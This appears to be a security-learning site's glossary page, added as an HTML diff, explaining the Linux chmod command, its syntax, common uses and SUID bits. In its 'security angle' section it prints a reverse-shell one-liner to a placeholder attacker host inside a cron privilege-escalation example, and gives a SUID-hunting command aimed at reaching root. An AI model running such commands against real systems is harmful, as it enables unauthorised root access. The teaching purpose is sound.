@@ -1,0 +1,219 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>chmod — The Permission-Changing Command ☕</title>
+<link rel="stylesheet" href="../assets/styles.css" />
+</head>
+<body data-page-slug="chmod">
+
+<div class="progress-wrap"><div class="progress-bar" id="progressBar"></div></div>
+
+<div class="topbar">
+  <a class="logo" href="../index.html">☕ CYBERSEC.VAULT</a>
+  <nav>
+    <a href="../index.html">Home</a>
+    <a href="../index.html#topics-web">Topics</a>
+    <a href="index.html" class="active">Glossary</a>
+    <a href="../tryhackme/index.html">THM</a>
+  </nav>
+  <div class="search-wrap">
+    <input type="text" class="search" placeholder="Search (press /)..." />
+    <div class="search-results"></div>
+  </div>
+</div>
+
+<div class="breadcrumb">
+  <a href="../index.html">Home</a>
+  <span class="sep">›</span>
+  <a href="index.html">Glossary</a>
+  <span class="sep">›</span>
+  <span>chmod</span>
+</div>
+
+<!-- HERO -->
+<section class="hero" style="min-height: 45vh;">
+  <div class="hero-content">
+    <span class="coffee-badge">📖 glossary · linux command · the privesc button</span>
+    <h1 style="font-family: var(--mono);">chmod 🔧</h1>
+    <p class="subtitle">Change <strong>mode</strong>. The command that flips read / write / execute bits<br>on any file or directory you own.</p>
+    <div class="tagline">"chmod +x, now it runs." 🏃</div>
+  </div>
+</section>
+
+<!-- WHAT IS IT -->
+<section class="chapter">
+  <div class="chapter-num">Chapter 01 // Definition</div>
+  <h2><span class="emoji">📖</span> What does chmod do?</h2>
+  <p class="lead">Short for "<strong>change mode</strong>." It's the command you use to modify the <span class="term" data-term="linux-permissions">permissions</span> (rwx bits) of files and directories.</p>
+
+  <div class="paper">
+    <h4>📝 Think of it like flipping switches on a security panel</h4>
+    <p>Every file has nine switches (3 groups × read/write/execute). <code>chmod</code> is the switch-flipper. You tell it which switches to flip and on which file — it does the thing. You must own the file (or be root).</p>
+  </div>
+
+  <h3>Two syntaxes. Same result.</h3>
+  <div class="grid cols-2">
+    <div class="card">
+      <h4>🔢 Numeric (absolute)</h4>
+      <p>Set exact permissions with a 3-digit octal number.</p>
+      <div class="code" style="margin-top: 8px;">
+chmod <span class="str">755</span> script.sh
+<span class="com"># owner=7 (rwx), group=5 (r-x), other=5 (r-x)</span>
+      </div>
+    </div>
+    <div class="card">
+      <h4>🔤 Symbolic (relative)</h4>
+      <p>Add (+) or remove (-) specific bits.</p>
+      <div class="code" style="margin-top: 8px;">
+chmod <span class="str">+x</span> script.sh     <span class="com"># add execute</span>
+chmod <span class="str">u+w</span> file       <span class="com"># owner + write</span>
+chmod <span class="str">go-rwx</span> secret  <span class="com"># group+others lose all</span>
+      </div>
+    </div>
+  </div>
+
+  <div class="callout info">
+    <strong>💡 Numeric vs symbolic when to use which?</strong> Numeric = you're setting everything fresh (deployment scripts, setting a known-good config). Symbolic = you're tweaking ONE bit without touching the others (making something executable, locking down one access level).
+  </div>
+</section>
+
+<div class="divider">syntax deep dive</div>
+
+<!-- SYMBOLIC DEEP DIVE -->
+<section class="chapter">
+  <div class="chapter-num">Chapter 02 // Symbolic syntax decoded</div>
+  <h2><span class="emoji">🔤</span> The <code class="inline">u/g/o/a + rwx</code> grammar</h2>
+
+  <p>Symbolic chmod reads like: <code class="inline">[WHO][OP][WHAT]</code></p>
+
+  <div class="grid cols-3">
+    <div class="card">
+      <h4>WHO</h4>
+      <ul style="font-size: 14px;">
+        <li><code class="inline">u</code> — user (owner)</li>
+        <li><code class="inline">g</code> — group</li>
+        <li><code class="inline">o</code> — others</li>
+        <li><code class="inline">a</code> — all (u+g+o)</li>
+      </ul>
+    </div>
+    <div class="card">
+      <h4>OP</h4>
+      <ul style="font-size: 14px;">
+        <li><code class="inline">+</code> — add these permissions</li>
+        <li><code class="inline">-</code> — remove these</li>
+        <li><code class="inline">=</code> — set exactly these (remove others)</li>
+      </ul>
+    </div>
+    <div class="card">
+      <h4>WHAT</h4>
+      <ul style="font-size: 14px;">
+        <li><code class="inline">r</code> — read</li>
+        <li><code class="inline">w</code> — write</li>
+        <li><code class="inline">x</code> — execute</li>
+        <li><code class="inline">X</code> — execute only if already executable on some group (for directories)</li>
+      </ul>
+    </div>
+  </div>
+
+  <h3>Examples</h3>
+  <div class="code">
+chmod u+x file        <span class="com"># owner gains execute</span>
+chmod go-w file       <span class="com"># group and others lose write</span>
+chmod a=r file        <span class="com"># everyone: read only</span>
+chmod u=rwx,go=rx f   <span class="com"># owner=rwx, group=r-x, others=r-x (== 755)</span>
+chmod -R 755 dir/     <span class="com"># recursive — applies to dir AND everything inside</span>
+  </div>
+</section>
+
+<div class="divider">real world</div>
+
+<!-- COMMON USES -->
+<section class="chapter">
+  <div class="chapter-num">Chapter 03 // The five chmods you'll use 90% of the time</div>
+  <h2><span class="emoji">🎯</span> The greatest hits</h2>
+
+  <div class="grid cols-2">
+    <div class="card">
+      <h4>📜 <code class="inline">chmod +x script.sh</code></h4>
+      <p>Make a script runnable. You downloaded or wrote a shell script; it won't execute until you flip the x bit. Most common chmod in beginner-land.</p>
+    </div>
+    <div class="card">
+      <h4>🗝️ <code class="inline">chmod 600 ~/.ssh/id_rsa</code></h4>
+      <p>Lock down an SSH private key. SSH itself will REFUSE to use the key if permissions are wider than 600. Forced security.</p>
+    </div>
+    <div class="card">
+      <h4>🏠 <code class="inline">chmod 700 ~/.ssh/</code></h4>
+      <p>Lock down the SSH directory itself. Same deal — SSH refuses if "others" can peek inside.</p>
+    </div>
+    <div class="card">
+      <h4>📁 <code class="inline">chmod -R 755 /var/www/html</code></h4>
+      <p>Standard web root perms. Readable + executable (traverse) by webserver. Writable only by owner.</p>
+    </div>
+    <div class="card">
+      <h4>💥 <code class="inline">chmod 777 thing</code></h4>
+      <p>The "fix my problem, I don't care how" chmod. 99% of the time it's wrong. Attackers love seeing it.</p>
+    </div>
+    <div class="card">
+      <h4>🔒 <code class="inline">chmod 400 secret.key</code></h4>
+      <p>Even stricter — not even the owner can write to it. Prevents accidental overwrites. Common for crypto keys, config.</p>
+    </div>
+  </div>
+</section>
+
+<!-- SECURITY ANGLE -->
+<section class="chapter">
+  <div class="chapter-num">Chapter 04 // The security angle</div>
+  <h2><span class="emoji">🥷</span> chmod-adjacent attacks</h2>
+
+  <div class="callout danger">
+    <strong>🚨 Classic privesc:</strong> A cron job running as root executes a shell script. The script has <code class="inline">chmod 777</code>. You edit it to add <code class="inline">bash -i &gt;&amp; /dev/tcp/attacker/4444 0&gt;&amp;1</code>. Next cron run: reverse shell as root. 🎣
+  </div>
+
+  <h3>SUID — the evil cousin</h3>
+  <p>There's a 4th digit you can prepend: <code class="inline">chmod 4755 file</code>. The <code class="inline">4</code> sets the <strong>SUID bit</strong>. Files with SUID run as their OWNER, not as you.</p>
+  <div class="code">
+chmod <span class="str">4755</span> /usr/bin/myapp     <span class="com"># SUID — runs as root if root owns it</span>
+chmod <span class="str">2755</span> sharedfolder       <span class="com"># SGID — files inherit folder's group</span>
+chmod <span class="str">1755</span> /tmp              <span class="com"># Sticky bit — only owner can delete their files</span>
+  </div>
+  <p>Find SUID binaries on any box you land on:</p>
+  <div class="code">find / -perm -4000 -type f 2&gt;/dev/null</div>
+  <p>Check each one against <a href="https://gtfobins.github.io/" target="_blank" rel="noopener">GTFOBins</a> — if it's on the list, you probably have a path to root.</p>
+
+  <div class="quiz">
+    <h4>🎯 Quick Check</h4>
+    <div class="q">You download <code class="inline">scanner.sh</code> from GitHub but <code class="inline">./scanner.sh</code> says "Permission denied." What's the fix?</div>
+    <div class="options">
+      <div class="opt" onclick="quizAnswer(this, false)">chmod 777 scanner.sh</div>
+      <div class="opt" onclick="quizAnswer(this, true)">chmod +x scanner.sh</div>
+      <div class="opt" onclick="quizAnswer(this, false)">sudo scanner.sh</div>
+      <div class="opt" onclick="quizAnswer(this, false)">mv scanner.sh scanner</div>
+    </div>
+    <div class="feedback"></div>
+  </div>
+</section>
+
+<!-- RELATED -->
+<section class="chapter">
+  <div class="related-terms">
+    <h4>🔗 Related in the vault</h4>
+    <div class="tags">
+      <a href="linux-permissions.html">🛡️ Linux Permissions</a>
+      <a href="su.html">👤 su</a>
+      <a href="ssh.html">🔐 SSH</a>
+      <a href="man-page.html">📖 Man Page</a>
+      <a href="../tryhackme/cybersec-101/linux-fundamentals-part-2.html">🐧 THM: Linux Fundamentals Pt. 2</a>
+    </div>
+  </div>
+</section>
+
+<footer class="site-foot">
+  <p class="coffee-line">Flip bits. Own boxes. Don't chmod 777. ☕</p>
+</footer>
+
+<script src="../assets/glossary.js"></script>
+<script src="../assets/app.js"></script>
+</body>
+</html>
